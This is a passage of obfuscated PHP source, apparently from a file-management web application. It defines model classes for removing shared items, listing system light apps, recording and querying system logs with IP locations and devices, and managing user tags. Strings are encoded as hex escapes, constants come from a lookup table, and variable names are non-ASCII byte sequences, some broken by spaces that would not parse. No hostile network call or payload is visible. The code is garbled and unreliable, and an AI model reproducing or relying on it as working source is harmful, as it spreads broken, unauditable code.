$çÔ‰û”—); Model($šƒ‰×ï©[199])->where($‚„ı°šÙ)->save($ø—Äº’•); } $this->removeByFileID($è¯‘›§©); if (!$Ğ¨Ë¸) { $Ã”Êôš¿->stop($ÉåçŒèó); return !1; } $Ã”Êôš¿->end(); if ($†¯Ê—ƒ¢ == $šƒ‰×ï©[1797]) { $this->remove($÷‘«ùÕÙ); } } public function progress($ä…·àã˜, $Ì´ÉË¸Â) { return Task::get($Ì´ÉË¸Â . $_SERVER[ßğøİ][2152] . $ä…·àã˜); } private function removeByFileID($øû¦÷îë = array()) { $ƒµ«· =& $_SERVER[ßğøİ]; if (empty($øû¦÷îë)) { return; } $ß×÷İŒ = array($ƒµ«·[468] => array($ƒµ«·[7], $øû¦÷îë)); $ùí”®µ¿ = Model($ƒµ«·[1327])->where($ß×÷İŒ)->field($ƒµ«·[402])->select(); if (!$ùí”®µ¿) { return; } $ùí”®µ¿ = array_to_keyvalue($ùí”®µ¿, $ƒµ«·[12], $ƒµ«·[402]); foreach ($ùí”®µ¿ as $à«®•¤é) { Model($ƒµ«·[416])->removeNow($à«®•¤é, !1); } } private function removeShareItems($°Æ…å‚¹) { $¿¿‘«Æ =& $_SERVER[ßğøİ]; $œ­µùü· = "\173\x69\157\x3a{$°Æ…å‚¹}\x7d\x2f"; $»Î×šÜÂ = array($¿¿‘«Æ[402] => 0, $¿¿‘«Æ[1176] => array($¿¿‘«Æ[383], "{$œ­µùü·}\x25")); $’²æü¢İ = Model($¿¿‘«Æ[1808])->where($»Î×šÜÂ)->field($¿¿‘«Æ[489])->select(); if (empty($’²æü¢İ)) { return; } $ş¾Î‘òÕ = array_to_keyvalue($’²æü¢İ, $¿¿‘«Æ[12], $¿¿‘«Æ[489]); Model($¿¿‘«Æ[601])->remove($ş¾Î‘òÕ); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\x2e\x4c\x69\x67\150\164\101\x70\x70"; public $modelType = "\x53\171\x73\164\145\155\117\x70\164\151\157\156"; public $field = array("\156\141\x6d\145", "\x67\162\157\165\x70", "\x64\x65\x73\143", "\143\x6f\x6e\x74\x65\156\164"); public function listData($Îíú±Ìö = false, $Ú°¤…ª = "\x6d\x6f\x64\x69\x66\171\x54\151\x6d\145", $ÉÓå›É = true) { return parent::listData($Îíú±Ìö, $Ú°¤…ª, $ÉÓå›É); } public function remove($ùôşµ¦‹) { $Ã—óãÂÍ = $this->findByName($ùôşµ¦‹); if (!$Ã—óãÂÍ) { return !1; } return parent::remove($Ã—óãÂÍ[$_SERVER[ßğøİ][399]]); } public function add($ññ‘Å·²) { if ($this->findByName($ññ‘Å·²[$_SERVER[ßğøİ][32]])) { return !1; } return parent::insert($ññ‘Å·²); } public function update($Ìş§„À¹, $†–ÄƒÅ‹) { $ÔËË¬¡ö =& $_SERVER[ßğøİ]; $›Ç¦š = $this->findByName($Ìş§„À¹); $•úê™ = $this->findByName($†–ÄƒÅ‹[$ÔËË¬¡ö[32]]); if (!$›Ç¦š || $•úê™ && $•úê™[$ÔËË¬¡ö[399]] != $›Ç¦š[$ÔËË¬¡ö[399]]) { return !1; } return parent::update($›Ç¦š[$ÔËË¬¡ö[399]], $†–ÄƒÅ‹); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\x65\155\137\154\157\x67"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\x65\124\151\x6d\145", "\x74\151\x6d\145", "\151\x6e\x73\x65\x72\x74", "\146\165\x6e\x63\164\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Ã¢ÅøÊ =& $_SERVER[ßğøİ]; return array($Ã¢ÅøÊ[2156] => LNG($Ã¢ÅøÊ[2157]), $Ã¢ÅøÊ[2158] => LNG($Ã¢ÅøÊ[2159]), $Ã¢ÅøÊ[1771] => LNG($Ã¢ÅøÊ[2160]), $Ã¢ÅøÊ[2161] => LNG($Ã¢ÅøÊ[2162]), $Ã¢ÅøÊ[2163] => LNG($Ã¢ÅøÊ[2164]), $Ã¢ÅøÊ[2165] => LNG($Ã¢ÅøÊ[2166]), $Ã¢ÅøÊ[2167] => LNG($Ã¢ÅøÊ[2168]), $Ã¢ÅøÊ[1801] => LNG($Ã¢ÅøÊ[2168]), $Ã¢ÅøÊ[1802] => LNG($Ã¢ÅøÊ[2169]), $Ã¢ÅøÊ[2170] => LNG($Ã¢ÅøÊ[2171]), $Ã¢ÅøÊ[2172] => LNG($Ã¢ÅøÊ[2173]), $Ã¢ÅøÊ[2174] => LNG($Ã¢ÅøÊ[2175]), $Ã¢ÅøÊ[2176] => LNG($Ã¢ÅøÊ[2177]), $Ã¢ÅøÊ[1799] => LNG($Ã¢ÅøÊ[2178]), $Ã¢ÅøÊ[2179] => LNG($Ã¢ÅøÊ[2180]), $Ã¢ÅøÊ[1806] => LNG($Ã¢ÅøÊ[2181]), $Ã¢ÅøÊ[2182] => LNG($Ã¢ÅøÊ[2183]), $Ã¢ÅøÊ[2184] => LNG($Ã¢ÅøÊ[2185]), $Ã¢ÅøÊ[2186] => LNG($Ã¢ÅøÊ[2187]), $Ã¢ÅøÊ[2188] => LNG($Ã¢ÅøÊ[2189]), $Ã¢ÅøÊ[1809] => LNG($Ã¢ÅøÊ[2190]), $Ã¢ÅøÊ[1810] => LNG($Ã¢ÅøÊ[2191]), $Ã¢ÅøÊ[2192] => LNG($Ã¢ÅøÊ[2193]), $Ã¢ÅøÊ[2194] => LNG($Ã¢ÅøÊ[2195]), $Ã¢ÅøÊ[2196] => LNG($Ã¢ÅøÊ[2197]), $Ã¢ÅøÊ[1804] => LNG($Ã¢ÅøÊ[2198]), $Ã¢ÅøÊ[2199] => LNG($Ã¢ÅøÊ[2200]), $Ã¢ÅøÊ[1803] => LNG($Ã¢ÅøÊ[2201]), $Ã¢ÅøÊ[2202] => LNG($Ã¢ÅøÊ[2203]), $Ã¢ÅøÊ[2204] => LNG($Ã¢ÅøÊ[2205]), $Ã¢ÅøÊ[2206] => LNG($Ã¢ÅøÊ[2207]), $Ã¢ÅøÊ[2208] => LNG($Ã¢ÅøÊ[2208]), $Ã¢ÅøÊ[2209] => LNG($Ã¢ÅøÊ[1775]), $Ã¢ÅøÊ[2210] => LNG($Ã¢ÅøÊ[2211]), $Ã¢ÅøÊ[2212] => LNG($Ã¢ÅøÊ[2213]), $Ã¢ÅøÊ[2214] => LNG($Ã¢ÅøÊ[2215]), $Ã¢ÅøÊ[2216] => LNG($Ã¢ÅøÊ[2217]), $Ã¢ÅøÊ[2218] => LNG($Ã¢ÅøÊ[2219]), $Ã¢ÅøÊ[2220] => LNG($Ã¢ÅøÊ[2220]), $Ã¢ÅøÊ[2221] => LNG($Ã¢ÅøÊ[2222]), $Ã¢ÅøÊ[2223] => LNG($Ã¢ÅøÊ[2224]), $Ã¢ÅøÊ[2225] => LNG($Ã¢ÅøÊ[2226]), $Ã¢ÅøÊ[2227] => LNG($Ã¢ÅøÊ[2228]), $Ã¢ÅøÊ[2229] => LNG($Ã¢ÅøÊ[2230]), $Ã¢ÅøÊ[2231] => LNG($Ã¢ÅøÊ[2232])); } private function typeFile() { $İî¢ü®Ğ =& $_SERVER[ßğøİ]; $ÒÑ®é‚ = array($İî¢ü®Ğ[1806] => array($İî¢ü®Ğ[1807]), $İî¢ü®Ğ[2174] => array($İî¢ü®Ğ[2233]), $İî¢ü®Ğ[2176] => array($İî¢ü®Ğ[2234]), $İî¢ü®Ğ[1799] => array($İî¢ü®Ğ[1800]), $İî¢ü®Ğ[2184] => array(), $İî¢ü®Ğ[2186] => array(), $İî¢ü®Ğ[2188] => array(), $İî¢ü®Ğ[1809] => array($İî¢ü®Ğ[1811]), $İî¢ü®Ğ[1810] => array($İî¢ü®Ğ[1811]), $İî¢ü®Ğ[2192] => array($İî¢ü®Ğ[2235]), $İî¢ü®Ğ[2194] => array($İî¢ü®Ğ[2235]), $İî¢ü®Ğ[2196] => array($İî¢ü®Ğ[2236]), $İî¢ü®Ğ[2182] => array($İî¢ü®Ğ[2237]), $İî¢ü®Ğ[1804] => array($İî¢ü®Ğ[2238]), $İî¢ü®Ğ[2199] => array($İî¢ü®Ğ[2239]), $İî¢ü®Ğ[1803] => array($İî¢ü®Ğ[1805])); return $ÒÑ®é‚; } private function typeAll() { $ÅüÑ°®Ú =& $_SERVER[ßğøİ]; $·çì‘ç = $this->typeList; $‚™ú³§Ê = array_filter($this->typeFile()); foreach ($‚™ú³§Ê as $¼…‹œÂ„ => $Î’¬Šñ) { $·çì‘ç[$Î’¬Šñ[0]] = $·çì‘ç[$¼…‹œÂ„]; } $·çì‘ç[$ÅüÑ°®Ú[1811]] = LNG($ÅüÑ°®Ú[2240]); $·çì‘ç[$ÅüÑ°®Ú[2235]] = LNG($ÅüÑ°®Ú[2241]); return $·çì‘ç; } public function addLog($Ö¾ıÙ’¹, $˜æÂ€›± = array()) { $ë•Ä¨Öş =& $_SERVER[ßğøİ]; if (!isset($this->typeList[$Ö¾ıÙ’¹])) { return; } $ª½œ•ÉÃ = defined($ë•Ä¨Öş[475]) && USER_ID ? USER_ID : (isset($˜æÂ€›±[$ë•Ä¨Öş[1655]]) ? $˜æÂ€›±[$ë•Ä¨Öş[1655]] : 0); if (!$ª½œ•ÉÃ) { $ª½œ•ÉÃ = (int) Session::get($ë•Ä¨Öş[1965]); } if ($Ö¾ıÙ’¹ == $ë•Ä¨Öş[2210] && is_array($˜æÂ€›±[$ë•Ä¨Öş[2242]]) && !$˜æÂ€›±[$ë•Ä¨Öş[2242]]) { return; } $ñ–„å€· = get_client_ip(); if (!$˜æÂ€›± || strlen(json_encode($˜æÂ€›±)) >= 1024) { $˜æÂ€›± = array($ë•Ä¨Öş[2243] => $ñ–„å€·); } else { if (is_array($˜æÂ€›±)) { $˜æÂ€›±[$ë•Ä¨Öş[2243]] = $ñ–„å€·; } else { $˜æÂ€›± = array($ë•Ä¨Öş[1193] => $˜æÂ€›±, $ë•Ä¨Öş[2243] => $ñ–„å€·); } } $˜æÂ€›± = array($ë•Ä¨Öş[1645] => Session::sign(), $ë•Ä¨Öş[1646] => $ª½œ•ÉÃ, $ë•Ä¨Öş[33] => $Ö¾ıÙ’¹, $ë•Ä¨Öş[1648] => json_encode($˜æÂ€›±)); parent::add($˜æÂ€›±); } public function remove($È¹ë¯ğ) { $this->where(array($_SERVER[ßğøİ][419] => $È¹ë¯ğ))->delete(); } private function _makeOrder($«Õ°È™ô = '') { $›ùÉ·¤  =& $_SERVER[ßğøİ]; $äˆˆâ× = $›ùÉ·¤ [200]; $×Ü¼ˆ—Œ = array($›ùÉ·¤ [450] => $›ùÉ·¤ [451], $›ùÉ·¤ [452] => $›ùÉ·¤ [453]); $ØÈ¨éÇî = Input::get($›ùÉ·¤ [458], $›ùÉ·¤ [7], $›ùÉ·¤ [1997], array($›ùÉ·¤ [1919], $›ùÉ·¤ [452])); $ØÈ¨éÇî = $×Ü¼ˆ—Œ[$ØÈ¨éÇî]; $«Õ°È™ô = $«Õ°È™ô . "{$äˆˆâ×}\40{$ØÈ¨éÇî}"; return $this->order($«Õ°È™ô); } public function get($ıº´‘” = '') { $¨áÓ¶–š =& $_SERVER[ßğøİ]; if (!$ıº´‘”) { show_json(array()); } $·³á™ó¸ = array(); if ($ıº´‘”[$¨áÓ¶–š[1655]]) { $·³á™ó¸[$¨áÓ¶–š[1655]] = $ıº´‘”[$¨áÓ¶–š[1655]]; } if (isset($ıº´‘”[$¨áÓ¶–š[758]])) { $İ”åòªâ = $ıº´‘”[$¨áÓ¶–š[758]]; $­¾³ù®¦ = isset($ıº´‘”[$¨áÓ¶–š[497]]) ? $ıº´‘”[$¨áÓ¶–š[497]] : time(); $·³á™ó¸[$¨áÓ¶–š[200]] = array($¨áÓ¶–š[333], array($İ”åòªâ, $­¾³ù®¦)); } if ($ıº´‘”[$¨áÓ¶–š[33]]) { $ÆşåŠÖ® = explode($¨áÓ¶–š[50], $ıº´‘”[$¨áÓ¶–š[33]]); $¥Õî¨ö = $this->typeFile(); $û€Ş»ÄÂ = array(); foreach ($ÆşåŠÖ® as $‘¦»àŞØ) { $û€Ş»ÄÂ[] = $‘¦»àŞØ; if (isset($¥Õî¨ö[$‘¦»àŞØ])) { $û€Ş»ÄÂ = array_merge($û€Ş»ÄÂ, $¥Õî¨ö[$‘¦»àŞØ]); } } $û€Ş»ÄÂ = array_unique($û€Ş»ÄÂ); if ($û€Ş»ÄÂ) { $·³á™ó¸[$¨áÓ¶–š[33]] = array($¨áÓ¶–š[7], $û€Ş»ÄÂ); } } else { $·³á™ó¸[$¨áÓ¶–š[33]] = array($¨áÓ¶–š[2244], $¨áÓ¶–š[2245]); } if (!empty($ıº´‘”[$¨áÓ¶–š[2243]])) { $·³á™ó¸[$¨áÓ¶–š[453]] = array($¨áÓ¶–š[383], "\x25{$ıº´‘”[$¨áÓ¶–š[2243]]}\x25"); } $ÖŸ·–‚½ = $this->_makeOrder()->where($·³á™ó¸)->selectPage(); if (empty($ÖŸ·–‚½[$¨áÓ¶–š[369]])) { show_json(array(), !0, $ÖŸ·–‚½[$¨áÓ¶–š[366]]); } $ÖŸ·–‚½[$¨áÓ¶–š[369]] = $this->logList($ÖŸ·–‚½[$¨áÓ¶–š[369]]); return $ÖŸ·–‚½; } private function ipAddress(&$‡©˜§¨ä) { $Òµ˜—Ò¿ =& $_SERVER[ßğøİ]; if (!empty($‡©˜§¨ä[$Òµ˜—Ò¿[2243]])) { $Ü‡ô””‘ = IpLocation::get($‡©˜§¨ä[$Òµ˜—Ò¿[2243]]); } else { $Ü‡ô””‘ = LNG($Òµ˜—Ò¿[2246]); } $‡©˜§¨ä[$Òµ˜—Ò¿[2247]] = $Ü‡ô””‘; } private function descZipDownload($‰à…Ï À, &$Å¾õ Ø–) { $¹¬Û€Üô =& $_SERVER[ßğøİ]; if (!isset($‰à…Ï À[$¹¬Û€Üô[2248]])) { return; } $ßÄœÏÔ„ = json_decode($‰à…Ï À[$¹¬Û€Üô[2248]], !0); foreach ($ßÄœÏÔ„ as $„”üÜ¶¶) { try { $ñœò¸¼ = IO::infoFull($„”üÜ¶¶[$¹¬Û€Üô[84]]); } catch (Exception $™ó¿ëéâ) { continue; } $‰à…Ï À[$¹¬Û€Üô[84]] = $„”üÜ¶¶[$¹¬Û€Üô[84]]; $Å¾õ Ø–[] = $‰à…Ï À[$¹¬Û€Üô[402]] = $ñœò¸¼[$¹¬Û€Üô[402]]; $Å¾õ Ø–[] = $‰à…Ï À[$¹¬Û€Üô[2051]] = $ñœò¸¼[$¹¬Û€Üô[432]]; break; } return $‰à…Ï À; } private function getSourceList(&$±Ç¾´ã) { $²¥»›íè =& $_SERVER[ßğøİ]; $ˆ„ºƒÊó = array(); foreach ($±Ç¾´ã as $ñîÙ²¬¤ => $€ŸıˆÏ½) { $Àş—’Î = json_decode($€ŸıˆÏ½[$²¥»›íè[453]], !0); if ($€ŸıˆÏ½[$²¥»›íè[33]] == $²¥»›íè[1802]) { $Àş—’Î = $this->descZipDownload($Àş—’Î, $ˆ„ºƒÊó); $±Ç¾´ã[$ñîÙ²¬¤][$²¥»›íè[453]] = json_encode($Àş—’Î); continue; } if (strpos($€ŸıˆÏ½[$²¥»›íè[33]], $²¥»›íè[2053]) !== 0) { if (!isset($Àş—’Î[$²¥»›íè[84]]) || strpos($€ŸıˆÏ½[$²¥»›íè[33]], $²¥»›íè[2249]) !== 0) { continue; } try { $ö·ÈÛÖÛ = IO::infoFull($Àş—’Î[$²¥»›íè[84]]); } catch (Exception $¾ÎµŸ¶•) { continue; } $ˆ„ºƒÊó[] = $Àş—’Î[$²¥»›íè[402]] = $ö·ÈÛÖÛ[$²¥»›íè[402]]; $ˆ„ºƒÊó[] = $Àş—’Î[$²¥»›íè[2051]] = $ö·ÈÛÖÛ[$²¥»›íè[432]]; $±Ç¾´ã[$ñîÙ²¬¤][$²¥»›íè[453]] = json_encode($Àş—’Î); continue; } $ˆ„ºƒÊó[] = $Àş—’Î[$²¥»›íè[402]]; $ˆ„ºƒÊó[] = $Àş—’Î[$²¥»›íè[2051]]; if ($Àş—’Î[$²¥»›íè[33]] == $²¥»›íè[557]) { $ˆ„ºƒÊó[] = $Àş—’Î[$²¥»›íè[453]][$²¥»›íè[1160]]; $ˆ„ºƒÊó[] = $Àş—’Î[$²¥»›íè[453]][$²¥»›íè[1161]]; } if ($Àş—’Î[$²¥»›íè[33]] == $²¥»›íè[2061]) { $ˆ„ºƒÊó[] = $Àş—’Î[$²¥»›íè[453]][$²¥»›íè[402]]; } } if (!$ˆ„ºƒÊó) { return array(); } return Model($²¥»›íè[822])->sourceListInfo($ˆ„ºƒÊó, !0); } private function logList($ğ²õ´ØÀ) { $©è€Õ =& $_SERVER[ßğøİ]; $èƒ¡ß¶¬ = array_to_keyvalue($ğ²õ´ØÀ, $©è€Õ[12], $©è€Õ[1655]); $–›·éœÒ = Model($©è€Õ[535])->userListInfo(array_unique($èƒ¡ß¶¬)); $ñ´¾¢Ó = $this->getSourceList($ğ²õ´ØÀ); $í ÏÌâ = $this->typeAll(); $ş¾À´…‹ = array(); $Åöíı‚œ = array(); foreach ($ğ²õ´ØÀ as $ùâŞ¦´Ú => $Ì®»õÚ±) { $àüÔÖÊ¡ = $Ì®»õÚ±[$©è€Õ[33]]; $ö¥ùô“” = isset($–›·éœÒ[$Ì®»õÚ±[$©è€Õ[1655]]]) ? $–›·éœÒ[$Ì®»õÚ±[$©è€Õ[1655]]] : !1; $¨›½¨× = strpos($àüÔÖÊ¡, $©è€Õ[2250]) === 0 ? LNG($©è€Õ[2251]) : LNG($©è€Õ[2246]); $Ì®»õÚ±[$©è€Õ[32]] = isset($ö¥ùô“”[$©è€Õ[32]]) ? $ö¥ùô“”[$©è€Õ[32]] : LNG($©è€Õ[2246]); $Ì®»õÚ±[$©è€Õ[542]] = isset($ö¥ùô“”[$©è€Õ[542]]) ? $ö¥ùô“”[$©è€Õ[542]] : $©è€Õ[12]; $Ì®»õÚ±[$©è€Õ[1554]] = isset($í ÏÌâ[$àüÔÖÊ¡]) ? $í ÏÌâ[$àüÔÖÊ¡] : $¨›½¨×; $Ì®»õÚ±[$©è€Õ[1996]] = $ö¥ùô“”; $÷€¹Òø× = json_decode($Ì®»õÚ±[$©è€Õ[453]], !0); $Ì®»õÚ±[$©è€Õ[2243]] = isset($÷€¹Òø×[$©è€Õ[2243]]) ? $÷€¹Òø×[$©è€Õ[2243]] : $©è€Õ[12]; $Ì®»õÚ±[$©è€Õ[2247]] = IpLocation::get($Ì®»õÚ±[$©è€Õ[2243]]); if (strpos($àüÔÖÊ¡, $©è€Õ[2053]) === 0 || isset($÷€¹Òø×[$©è€Õ[2051]])) { $÷€¹Òø×[$©è€Õ[86]] = $ñ´¾¢Ó[$÷€¹Òø×[$©è€Õ[402]]]; $÷€¹Òø×[$©è€Õ[2066]] = $ñ´¾¢Ó[$÷€¹Òø×[$©è€Õ[2051]]]; if ($÷€¹Òø×[$©è€Õ[33]] == $©è€Õ[557]) { $÷€¹Òø×[$©è€Õ[453]][$©è€Õ[1160]] = $ñ´¾¢Ó[$÷€¹Òø×[$©è€Õ[453]][$©è€Õ[1160]]]; $÷€¹Òø×[$©è€Õ[453]][$©è€Õ[1161]] = $ñ´¾¢Ó[$÷€¹Òø×[$©è€Õ[453]][$©è€Õ[1161]]]; } if ($÷€¹Òø×[$©è€Õ[33]] == $©è€Õ[2061]) { $÷€¹Òø×[$©è€Õ[453]][$©è€Õ[402]] = $ñ´¾¢Ó[$÷€¹Òø×[$©è€Õ[453]][$©è€Õ[402]]]; } if ($÷€¹Òø×[$©è€Õ[33]] == $©è€Õ[1797]) { $÷€¹Òø×[$©è€Õ[2066]] = $÷€¹Òø×[$©è€Õ[86]]; $÷€¹Òø×[$©è€Õ[2051]] = $÷€¹Òø×[$©è€Õ[2066]][$©è€Õ[402]]; $÷€¹Òø×[$©è€Õ[86]] = !1; $÷€¹Òø×[$©è€Õ[402]] = $©è€Õ[12]; } if ($÷€¹Òø×[$©è€Õ[86]] && $÷€¹Òø×[$©è€Õ[86]][$©è€Õ[411]] == $©è€Õ[1276]) { $Åöíı‚œ[] = $Ì®»õÚ±[$©è€Õ[399]]; unset($ğ²õ´ØÀ[$ùâŞ¦´Ú]); continue; } if ($÷€¹Òø×[$©è€Õ[2066]] && $÷€¹Òø×[$©è€Õ[2066]][$©è€Õ[411]] == $©è€Õ[1276]) { $Åöíı‚œ[] = $Ì®»õÚ±[$©è€Õ[399]]; unset($ğ²õ´ØÀ[$ùâŞ¦´Ú]); continue; } } $Ì®»õÚ±[$©è€Õ[453]] = $÷€¹Òø×; unset($Ì®»õÚ±[$©è€Õ[2252]]); $ş¾À´…‹[] = $Ì®»õÚ±; } $this->clearSystemPathLog($Åöíı‚œ); return $ş¾À´…‹; } private function clearSystemPathLog($ÚèÈÔÁŸ) { $ÑêÌòûÄ =& $_SERVER[ßğøİ]; if (count($ÚèÈÔÁŸ) == 0) { return; } $ì–¹òç = array($ÑêÌòûÄ[399] => array($ÑêÌòûÄ[7], array_unique($ÚèÈÔÁŸ))); $this->where($ì–¹òç)->delete(); } public function deviceList($¡Œµøı, $¨¦Ç¯Â‡ = 0) { $‡µ¤ßó =& $_SERVER[ßğøİ]; $ìĞ·›¿æ = array($‡µ¤ßó[1655] => $¡Œµøı, $‡µ¤ßó[200] => array($‡µ¤ßó[1014], $¨¦Ç¯Â‡), $‡µ¤ßó[33] => $‡µ¤ßó[1771]); $²ÁÖ¥ƒü = array(); $ØÜ¾Àš· = $this->field($‡µ¤ßó[2253])->where($ìĞ·›¿æ)->order($‡µ¤ßó[2064])->limit(50)->select(); foreach ($ØÜ¾Àš· as $ìÃÎù±¡ => $¯Ä±†Ò÷) { if ($ìÃÎù±¡ > 0 && abs($¯Ä±†Ò÷[$‡µ¤ßó[200]] - $ØÜ¾Àš·[$ìÃÎù±¡ - 1][$‡µ¤ßó[200]]) < 5) { continue; } $»¢ÁàØê = json_decode($¯Ä±†Ò÷[$‡µ¤ßó[453]], !0); $¯Ä±†Ò÷[$‡µ¤ßó[2243]] = isset($»¢ÁàØê[$‡µ¤ßó[2243]]) ? $»¢ÁàØê[$‡µ¤ßó[2243]] : $‡µ¤ßó[12]; unset($»¢ÁàØê[$‡µ¤ßó[2243]]); $”Öô­ôï = $this->deviceType($»¢ÁàØê[$‡µ¤ßó[2054]]); if (isset($²ÁÖ¥ƒü[$”Öô­ôï])) { continue; } $¯Ä±†Ò÷[$‡µ¤ßó[2247]] = IpLocation::get($¯Ä±†Ò÷[$‡µ¤ßó[2243]]); $¯Ä±†Ò÷[$‡µ¤ßó[453]] = $»¢ÁàØê; $²ÁÖ¥ƒü[$”Öô­ôï] = $¯Ä±†Ò÷; } return array_values($²ÁÖ¥ƒü); } public function deviceType($Ò†ë¤×) { return $Ò†ë¤×; } } goto D…¡æŒ•îğ; a•Æœ£á­Ş: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\x66\x61\166"; protected function cacheFunctionAlias($¨Æ®¶ ¹) { $ş¿Ó†Ë” =& $_SERVER[ßğøİ]; return array($ş¿Ó†Ë”[1939] => array($ş¿Ó†Ë”[2319] . USER_ID, $ş¿Ó†Ë”[1940])); } protected function listData() { $Å£…ùÜ° =& $_SERVER[ßğøİ]; $şî¨¦”ª = array($Å£…ùÜ°[1646] => USER_ID, $Å£…ùÜ°[484] => array($Å£…ùÜ°[1943], 0)); $¶ûäú±µ = $Å£…ùÜ°[2320]; $˜Ã‡¤Öä = $this->field($¶ûäú±µ)->where($şî¨¦”ª)->order($Å£…ùÜ°[1946])->select(); return $˜Ã‡¤Öä ? $˜Ã‡¤Öä : array(); } protected function addToTag($ğì¿¸à¹, $­«é™éº) { $üûÅ’Šö =& $_SERVER[ßğøİ]; if (!Model($üûÅ’Šö[2083])->listData($­«é™éº)) { return !1; } if (is_numeric($ğì¿¸à¹)) { $™³ã£– = Model($üûÅ’Šö[822])->pathInfo($ğì¿¸à¹); if (!$™³ã£–) { return !1; } } else { $™³ã£– = IO::infoSimple($ğì¿¸à¹); if (!$™³ã£–) { return !1; } $øÁ§¡Ì = $™³ã£–[$üûÅ’Šö[32]]; $Á“Ğ÷ÉÉ = $™³ã£–[$üûÅ’Šö[33]]; if (isset($™³ã£–[$üûÅ’Šö[410]])) { $Á“Ğ÷ÉÉ = $™³ã£–[$üûÅ’Šö[410]] == $üûÅ’Šö[88] ? $üûÅ’Šö[75] : $üûÅ’Šö[199]; } } $Ò´ÔÛªŠ = array($üûÅ’Šö[1646] => USER_ID, $üûÅ’Šö[484] => $­«é™éº, $üûÅ’Šö[421] => $ğì¿¸à¹, $üûÅ’Šö[422] => $Á“Ğ÷ÉÉ ? $Á“Ğ÷ÉÉ : $üûÅ’Šö[416], $üûÅ’Šö[420] => $øÁ§¡Ì ? $øÁ§¡Ì : $üûÅ’Šö[12], $üûÅ’Šö[1832] => 0); if ($this->where($Ò´ÔÛªŠ)->find()) { return !1; } return $this->add($Ò´ÔÛªŠ); } protected function removeFromTag($Å±¡şÇğ, $¢îíóıÛ) { $Ìã¡¿É =& $_SERVER[ßğøİ]; if (!Model($Ìã¡¿É[2083])->listData($¢îíóıÛ)) { return !1; } if (is_array($Å±¡şÇğ)) { $Å±¡şÇğ = array($Ìã¡¿É[7], $Å±¡şÇğ); } $ÃƒôşºÂ = array($Ìã¡¿É[1646] => USER_ID, $Ìã¡¿É[484] => $¢îíóıÛ, $Ìã¡¿É[421] => $Å±¡şÇğ); return $this->where($ÃƒôşºÂ)->delete(); } protected function removeByTag($ĞËõû½Â) { $˜ôéÑ =& $_SERVER[ßğøİ]; if (!$ĞËõû½Â) { return !1; } $Š²¥‘ò = array($˜ôéÑ[1646] => USER_ID, $˜ôéÑ[484] => $ĞËõû½Â); return $this->where($Š²¥‘ò)->delete(); } protected function removeBySource($öª’ŒÃÛ) { $ŸÊÉ¿æÁ =& $_SERVER[ßğøİ]; if (is_array($öª’ŒÃÛ)) { $öª’ŒÃÛ = array($ŸÊÉ¿æÁ[7], $öª’ŒÃÛ); } $İÁÔÅÅ = array($ŸÊÉ¿æÁ[1646] => USER_ID, $ŸÊÉ¿æÁ[484] => array($ŸÊÉ¿æÁ[1014], 0), $ŸÊÉ¿æÁ[421] => $öª’ŒÃÛ); return $this->where($İÁÔÅÅ)->delete(); } }